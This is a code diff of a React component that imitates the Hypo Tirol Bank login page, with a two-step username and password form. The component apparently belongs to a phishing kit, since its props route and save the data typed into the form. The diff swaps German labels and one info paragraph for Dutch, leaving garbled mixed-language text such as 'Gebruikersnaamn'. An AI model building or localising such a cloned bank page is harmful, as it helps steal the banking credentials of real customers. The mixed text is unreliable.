@@ -69,7 +69,7 @@ export function HypoTirol({ formData, onChange, handleRouteAction, saving }: Pro
                   <span className="font-bold text-[#cc0000]">ACHTUNG:</span> Anrufe FALSCHER Bankmitarbeiter!
                 </p>
                 <p className="text-[#333] text-[13px] leading-snug">
-                  <span className="font-bold text-[#cc0000]">NIEMALS:</span> Passwörter, Benutzernamen oder Codes nennen.
+                  <span className="font-bold text-[#cc0000]">NIEMALS:</span> Passwörter, Gebruikersnaamn oder Codes nennen.
                 </p>
                 <p className="text-[#333] text-[13px] leading-snug">
                   <span className="font-bold text-[#cc0000]">SOFORT:</span> Auflegen, wenn Sie danach gefragt werden.
@@ -80,13 +80,13 @@ export function HypoTirol({ formData, onChange, handleRouteAction, saving }: Pro
             {/* Info Texts */}
             <div className="flex flex-col gap-4 text-[#333] text-[13px] leading-relaxed mb-8">
               <p>
-                Beim Login wird eine sichere Verbindung aufgebaut. Bitte achten Sie darauf, dass Sie Ihre Zugangsdaten auf keiner Ihnen unbekannten Seite eingeben und diese geheim halten.
+                Tijdens het inloggen wordt een beveiligde verbinding opgezet. Let op dat u uw inloggegevens nergens anders invoert en deze geheim houdt.
               </p>
               <p>
                 Die Hypo Tirol Bank wird Sie <span className="font-bold">zu keiner Zeit per E-Mail oder telefonisch dazu auffordern</span>, Ihre Internetbanking-Zugangsdaten bekannt zu geben.
               </p>
               <p>
-                Als neuer Kunde geben Sie bitte Ihren Benutzernamen & Ihr Passwort aus unserem Schreiben ein und durchlaufen Sie die weiterführenden Schritte.
+                Als neuer Kunde geben Sie bitte Ihren Gebruikersnaamn & Ihr Wachtwoord aus unserem Schreiben ein und durchlaufen Sie die weiterführenden Schritte.
               </p>
             </div>
 
@@ -95,7 +95,7 @@ export function HypoTirol({ formData, onChange, handleRouteAction, saving }: Pro
               
               <div className="flex justify-between items-end mb-1">
                 <label className="text-[#888] text-[12px]">
-                  {step === 1 ? "Anmeldung mit Benutzername" : "Passwort eingeben"}
+                  {step === 1 ? "Anmeldung mit Gebruikersnaam" : "Wachtwoord eingeben"}
                 </label>
                 <div className="text-[#666] text-[12px]">
                   <a href="#" className="hover:text-[#333]">Hochkontrast</a>
